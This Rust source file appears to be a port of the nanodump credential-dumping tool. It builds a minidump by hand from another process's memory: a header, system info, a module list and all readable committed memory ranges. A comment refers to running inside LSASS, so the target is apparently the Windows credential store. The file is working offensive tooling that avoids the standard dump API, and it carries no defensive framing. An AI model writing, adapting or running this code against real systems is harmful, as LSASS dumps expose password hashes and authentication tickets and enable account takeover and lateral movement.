use crate::nt::dump::model;
use crate::nt::dump::model::IMPORTANT_MODULES;
use crate::nt::dump::model::*;
use crate::nt::dump::modules::{find_modules, ModuleInfo};
use crate::nt::system::{query_virtual_memory, read_virtual_memory};
use crate::utils::utils::unicode_to_string;
use log::{debug, error};
use ntapi::ntmmapi::MEMORY_INFORMATION_CLASS;
use std::ffi::c_void;
use std::ptr::read_unaligned;
use windows::Win32::Foundation::UNICODE_STRING;
use windows::Win32::System::Memory::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, PAGE_EXECUTE, PAGE_GUARD, PAGE_NOACCESS};
use windows_sys::Win32::System::SystemServices::VER_NT_WORKSTATION;

pub fn nano_dump_write_dump(dc: &mut DumpContext) -> Result<(), DumpError> {
    debug!("Writing nanodump");

    write_header(dc)?;

    write_directory(dc, StreamType::SystemInfoStream)?;
    write_directory(dc, StreamType::ModuleListStream)?;
    write_directory(dc, StreamType::Memory64ListStream)?;

    write_system_info_stream(dc)?;

    let modules = write_module_list_stream(dc);

    if modules.is_none() {
        error!("No modules found");
        return Err(DumpError::WriteFailed)
    }

    if !write_memory64_list_stream(dc, modules.unwrap()){
        return Err(DumpError::WriteFailed)
    }

    Ok(())
}

fn write_header(dc: &mut DumpContext) -> Result<(), DumpError> {
    debug!("Writing header");

    let header = MiniDumpHeader {
        signature: dc.signature,
        version: dc.version,
        implementation_version: dc.implementation_version,
        number_of_streams: 3,
        stream_directory_rva: SIZE_OF_HEADER as u32,
        check_sum: 0,
        reserved: 0,
        time_date_stamp: 0,
        flags: MiniDumpType::MiniDumpNormal as u32,
    };

    debug!("Header: {:?}", header);

    let mut buf = Vec::with_capacity(SIZE_OF_HEADER);

    buf.extend_from_slice(&header.signature.to_le_bytes());
    buf.extend_from_slice(&header.version.to_le_bytes());
    buf.extend_from_slice(&header.implementation_version.to_le_bytes());
    buf.extend_from_slice(&header.number_of_streams.to_le_bytes());
    buf.extend_from_slice(&header.stream_directory_rva.to_le_bytes());
    buf.extend_from_slice(&header.check_sum.to_le_bytes());
    buf.extend_from_slice(&header.reserved.to_le_bytes());
    buf.extend_from_slice(&header.time_date_stamp.to_le_bytes());
    buf.extend_from_slice(&header.flags.to_le_bytes());

    dc.append(&buf)?;

    Ok(())
}

fn write_directory(dc: &mut DumpContext, stream_type: StreamType) -> Result<(), DumpError> {

    let directory : MiniDumpDirectory = MiniDumpDirectory {
        stream_type: stream_type as u32,
        data_size: 0, // this is calculated and written later
        rva: 0, // this is calculated and written later
    };

    let mut buf: Vec<u8> = Vec::with_capacity(SIZE_OF_DIRECTORY);

    buf.extend_from_slice(&directory.stream_type.to_le_bytes());
    buf.extend_from_slice(&directory.data_size.to_le_bytes());
    buf.extend_from_slice(&directory.rva.to_le_bytes());

    dc.append(&buf)?;

    Ok(())
}

fn write_system_info_stream(dc: &mut DumpContext) -> Result<(), DumpError> {
    debug!("Writing system info stream");

    let mut system_info: MiniDumpSystemInfo = MiniDumpSystemInfo::default();

    let p_peb = model::get_peb();

    let os_major = model::rva::<u32>(p_peb, OS_MAJOR_VERSION_OFFSET);
    let os_minor = model::rva::<u32>(p_peb, OS_MINOR_VERSION_OFFSET);
    let os_build = model::rva::<u32>(p_peb, OS_BUILD_NUMBER_OFFSET);
    let os_platform_id = model::rva::<u32>(p_peb, OS_PLATFORM_ID_OFFSET);
    let csd_version = model::rva::<UNICODE_STRING>(p_peb, CSD_VERSION_OFFSET);

    system_info.processor_architecture = PROCESSOR_ARCHITECTURE as i16;

    debug!("OS version: {}.{}.{}", unsafe { *os_major }, unsafe { *os_minor }, unsafe { *os_build });
    debug!("OS platform ID: {}", unsafe { *os_platform_id });
    debug!("CSD version RVA: {}", unsafe { unicode_to_string(&(*csd_version)) });

    system_info.processor_level = 0;
    system_info.processor_revision = 0;
    system_info.number_of_processors = 0;

    system_info.product_type = VER_NT_WORKSTATION as i8;

    system_info.major_version = unsafe { *os_major };
    system_info.minor_version = unsafe { *os_minor };
    system_info.build_number = unsafe { *os_build };
    system_info.platform_id = unsafe { *os_platform_id };
    system_info.csd_version_rva = 0;
    system_info.suite_mask = 0;
    system_info.reserved2 = 0;

    #[cfg(target_arch = "x86_64")]
    {
        system_info.processor_features1 = 0;
        system_info.processor_features2 = 0;
    }
    #[cfg(target_arch = "x86")]
    {
        system_info.vendor_id1 = 0;
        system_info.vendor_id2 = 0;
        system_info.vendor_id3 = 0;
        system_info.version_information = 0;
        system_info.feature_information = 0;
        system_info.amd_extended_cpu_features = 0;
    }

    let stream_size = SIZE_OF_SYSTEM_INFO_STREAM as u32;

    let mut buf = Vec::with_capacity(stream_size as usize);

    buf.extend_from_slice(&system_info.processor_architecture.to_le_bytes());
    buf.extend_from_slice(&system_info.processor_level.to_le_bytes());
    buf.extend_from_slice(&system_info.processor_revision.to_le_bytes());
    buf.extend_from_slice(&system_info.number_of_processors.to_le_bytes());
    buf.extend_from_slice(&system_info.product_type.to_le_bytes());
    buf.extend_from_slice(&system_info.major_version.to_le_bytes());
    buf.extend_from_slice(&system_info.minor_version.to_le_bytes());
    buf.extend_from_slice(&system_info.build_number.to_le_bytes());
    buf.extend_from_slice(&system_info.platform_id.to_le_bytes());
    buf.extend_from_slice(&system_info.csd_version_rva.to_le_bytes());
    buf.extend_from_slice(&system_info.suite_mask.to_le_bytes());
    buf.extend_from_slice(&system_info.reserved2.to_le_bytes());
    #[cfg(target_arch = "x86_64")]
    {
        buf.extend_from_slice(&system_info.processor_features1.to_le_bytes());
        buf.extend_from_slice(&system_info.processor_features2.to_le_bytes());
    }
    #[cfg(target_arch = "x86")]
    {
        buf.extend_from_slice(&system_info.vendor_id1.to_le_bytes());
        buf.extend_from_slice(&system_info.vendor_id2.to_le_bytes());
        buf.extend_from_slice(&system_info.vendor_id3.to_le_bytes());
        buf.extend_from_slice(&system_info.version_information.to_le_bytes());
        buf.extend_from_slice(&system_info.feature_information.to_le_bytes());
        buf.extend_from_slice(&system_info.amd_extended_cpu_features.to_le_bytes());
    }

    let stream_rva = dc.rva;

    dc.append(&buf)?;

    // write our length in the MiniDumpSystemInfo directory
    dc.write_at((SIZE_OF_HEADER + 4) as u32, &stream_size.to_le_bytes())?;
    // write our RVA in the MiniDumpSystemInfo directory
    dc.write_at((SIZE_OF_HEADER + 8) as u32, &stream_rva.to_le_bytes())?;

    // write the service pack
    let sp_rva = dc.rva;
    let length = (unsafe { *csd_version }).Length as u32;
    dc.append(&length.to_le_bytes())?;

    // Access the Buffer field through dereferencing the raw pointer first
    let buffer = unsafe { (*csd_version).Buffer };

    // Get the unicode string as bytes
    let buffer_bytes = unsafe {
        // Get the Buffer content as a slice
        let str_ptr = buffer.as_ptr();
        let mut len: usize = 0;

        // Count characters until null terminator
        while *str_ptr.add(len) != 0 {
            len += 1;
        }

        // Convert to bytes (including null terminator)
        std::slice::from_raw_parts(str_ptr as *const u8, (len + 1) * 2)
    };

    dc.append(buffer_bytes)?;


    dc.write_at(stream_rva + 24, &sp_rva.to_le_bytes())?;


    Ok(())
}

fn write_module_list_stream(dc: &mut DumpContext) -> Option<Vec<ModuleInfo>> {
    debug!("Writing module list stream");

    let module_list = find_modules(dc.h_process, IMPORTANT_MODULES.to_vec(), true);

    if module_list.is_none() {
        error!("No modules found");
        return None;
    }

    let mut modules = module_list.unwrap();

    for module in modules.iter_mut() {
        module.name_rva = dc.rva;


        let full_name_len = module
            .dll_name
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(module.dll_name.len());

        let full_name_len_bytes = full_name_len * 2;

        if dc.append(&(full_name_len_bytes as u32).to_le_bytes()).is_err() {
            error!("Failed to append full_name_len_bytes list");
            return None;
        }

        // transformer les u16 en bytes little-endian
        let full_name_bytes: Vec<u8> = module.dll_name[..full_name_len]
            .iter()
            .flat_map(|c| c.to_le_bytes()) // chaque u16 -> 2 u8 en little-endian
            .collect();

        if dc.append(&full_name_bytes).is_err() {
            error!("Failed to append dll_name list");
            return None;
        }
    }

    let stream_rva = dc.rva;

    if dc.append(&(modules.len() as u32).to_le_bytes()).is_err() {
        error!("Failed to append module len list");
        return None;
    }

    let mut buf: Vec<u8> = Vec::with_capacity(SIZE_OF_MINIDUMP_MODULE * modules.len());

    for current_module  in modules.iter_mut() {
        let mut module : MiniDumpModule = MiniDumpModule::default();
        module.base_of_image = current_module.dll_base;
        module.size_of_image = current_module.size_of_image;
        module.check_sum = current_module.check_sum;
        module.time_date_stamp = current_module.time_date_stamp;
        module.module_name_rva = current_module.name_rva;
        module.version_info.signature = 0;
        module.version_info.struct_version = 0;
        module.version_info.file_version_ms = 0;
        module.version_info.file_version_ls = 0;
        module.version_info.product_version_ms = 0;
        module.version_info.product_version_ls = 0;
        module.version_info.file_flags_mask = 0;
        module.version_info.file_flags = 0;
        module.version_info.file_os = 0;
        module.version_info.file_type = 0;
        module.version_info.file_subtype = 0;
        module.version_info.file_date_ms = 0;
        module.version_info.file_date_ls = 0;
        module.cv_record.data_size = 0;
        module.cv_record.rva = 0;
        module.misc_record.data_size = 0;
        module.misc_record.rva = 0;
        module.reserved0 = 0;
        module.reserved1 = 0;

        let full_name_len = current_module.dll_name
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(current_module.dll_name.len());

        let dll_name_string = String::from_utf16_lossy(&current_module.dll_name[..full_name_len]);

        buf.extend_from_slice(&module.base_of_image.to_le_bytes());
        buf.extend_from_slice(&module.size_of_image.to_le_bytes());
        buf.extend_from_slice(&module.check_sum.to_le_bytes());
        buf.extend_from_slice(&module.time_date_stamp.to_le_bytes());
        buf.extend_from_slice(&module.module_name_rva.to_le_bytes());

        // version info
        buf.extend_from_slice(&module.version_info.signature.to_le_bytes());
        buf.extend_from_slice(&module.version_info.struct_version.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_version_ms.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_version_ls.to_le_bytes());
        buf.extend_from_slice(&module.version_info.product_version_ms.to_le_bytes());
        buf.extend_from_slice(&module.version_info.product_version_ls.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_flags_mask.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_flags.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_os.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_type.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_subtype.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_date_ms.to_le_bytes());
        buf.extend_from_slice(&module.version_info.file_date_ls.to_le_bytes());

        // CvRecord et MiscRecord
        buf.extend_from_slice(&module.cv_record.data_size.to_le_bytes());
        buf.extend_from_slice(&module.cv_record.rva.to_le_bytes());
        buf.extend_from_slice(&module.misc_record.data_size.to_le_bytes());
        buf.extend_from_slice(&module.misc_record.rva.to_le_bytes());

        // Reserved
        buf.extend_from_slice(&module.reserved0.to_le_bytes());
        buf.extend_from_slice(&module.reserved1.to_le_bytes());

    }
    if dc.append(&buf).is_err() {
        error!("Failed to append module");
        return None;
    }
    buf.clear();

    let stream_size :u32 = (4 + modules.len() * SIZE_OF_MINIDUMP_MODULE )as u32;
    if dc.write_at((SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4) as u32, &stream_size.to_le_bytes()).is_err() {
        error!("Failed to write stream size");
        return None;
    }

    if dc.write_at((SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 8) as u32, &stream_rva.to_le_bytes()).is_err() {
        error!("Failed to write stream RVA");
        return None;
    }
    Some(modules)
}

fn write_memory64_list_stream(dc: &mut DumpContext, modules: Vec<ModuleInfo>) -> bool {

    let stream_rva : u32 = dc.rva;

    debug!("Writing the Memory64ListStream");
    let memory_ranges: Option<Vec<MiniDumpMemoryDescriptor64>> = get_memory_ranges(dc, modules);

    if memory_ranges.is_none() {
        error!("Failed to write the Memory64ListStream");
    }

    let mut memory_ranges = memory_ranges.unwrap();

    if dc.append(&(memory_ranges.len() as u64).to_le_bytes()).is_err() {
        error!("Failed to write the Memory64ListStream");
        return false;
    }
    if (16 + 16 * memory_ranges.len()) > 0xffffffff {
        error!("Too many ranges!");
        return false
    }

    let stream_size : u32 = (16 + 16 * memory_ranges.len()) as u32;
    let base_rva = (stream_rva + stream_size) as u64;

    if dc.append(&(base_rva).to_le_bytes()).is_err() {
        error!("Failed to write the Memory64ListStream");
        return false;
    }

    for range in memory_ranges.iter() {
        if dc.append(&range.start_of_memory_range.to_le_bytes()).is_err() {
            error!("Failed to write the Memory64ListStream");
            return false;
        }
        if dc.append(&range.data_size.to_le_bytes()).is_err() {
            error!("Failed to write the Memory64ListStream");
            return false;
        }
    }

    dc.write_at((SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4) as u32, &stream_size.to_le_bytes()).ok();

    dc.write_at((SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 8) as u32, &stream_rva.to_le_bytes()).ok();

    for range in memory_ranges.iter_mut() {

        let ret = read_virtual_memory(dc.h_process, range.start_of_memory_range as *mut c_void, range.data_size as usize);

        if ret.is_none(){
            error!("Failed to read memory range");
            return false
        }

        let (mut buffer, bytes_read)  = ret.unwrap();

        if range.data_size > 0xffffffff {
            error!("The current range is larger that the 32-bit address space!");
            range.data_size = 0xffffffff;
        }

        if dc.append(&buffer[..bytes_read]).is_err()
        {
            error!("Failed to write the Memory64ListStream");
            return false
        }
        buffer.clear();

    }
    true
}

fn get_memory_ranges(dc: &mut DumpContext, modules: Vec<ModuleInfo>) -> Option<Vec<MiniDumpMemoryDescriptor64>> {
    debug!("Getting memory ranges to dump");

    let mut base_address :*mut c_void;
    let mut region_size : usize;
    let mut current_address : usize = 0;
    let mic : MEMORY_INFORMATION_CLASS = 0;
    let mut mbi : MEMORY_BASIC_INFORMATION;

    let mut range_list : Vec<MiniDumpMemoryDescriptor64> = Vec::new();

    loop {
        unsafe {
            let buffer = query_virtual_memory(dc.h_process,current_address as _, mic);

            if buffer.is_none(){
                break
            }

            let buffer = buffer?;

            mbi = unsafe {
                read_unaligned(buffer.as_ptr() as *const MEMORY_BASIC_INFORMATION)
            };

            base_address = mbi.BaseAddress;
            region_size = mbi.RegionSize;


            if base_address as usize + region_size < base_address as usize {
                break
            }

            current_address = rva::<c_void>(base_address as *const u8, region_size) as usize;

            // ignore non-committed pages
            if mbi.State != MEM_COMMIT {
                continue;
            }

            // ignore mapped pages
            if mbi.Type == MEM_MAPPED {
                continue;
            }

            // ignore PAGE_NOACCESS
            if mbi.Protect & PAGE_NOACCESS == PAGE_NOACCESS {
                continue;
            }

            // ignore PAGE_GUARD
            if mbi.Protect & PAGE_GUARD == PAGE_GUARD {
                continue;
            }

            // ignore executable pages
            if mbi.Protect & PAGE_EXECUTE == PAGE_EXECUTE
            {
                continue;
            }

            // ignore non-relevant image modules
            if mbi.Type == MEM_IMAGE
                && !is_important_module(mbi.BaseAddress as usize, &modules)
            {
                continue;
            }
            #[cfg(feature = "ssp")]
            {
                // if nanodump is running in LSASS, don't dump the dump :)
                if dc.base_address == base_address {
                    continue;
                }
            }

            let range = MiniDumpMemoryDescriptor64{
                start_of_memory_range: base_address as u64,
                data_size: region_size as u64,
                state: mbi.State.0,
                protect: mbi.Protect.0,
                typ: mbi.Type.0,
            };
            range_list.push(range);
        }
    }

    if range_list.len() == 0 {
        error!("Failed to enumerate memory ranges");
        return None;
    }
    debug!("Enumearted {} ranges of memory", range_list.len());
    Some(range_list)
}

fn is_important_module(address: usize, modules: &Vec<ModuleInfo>) -> bool {
    for module in modules.iter() {
        let base = module.dll_base as usize;
        let end = rva::<usize>(module.dll_base as *const u8, module.size_of_image as usize) as usize;

        if address >= base && address < end  {
            return true;
        }
    }
    false
}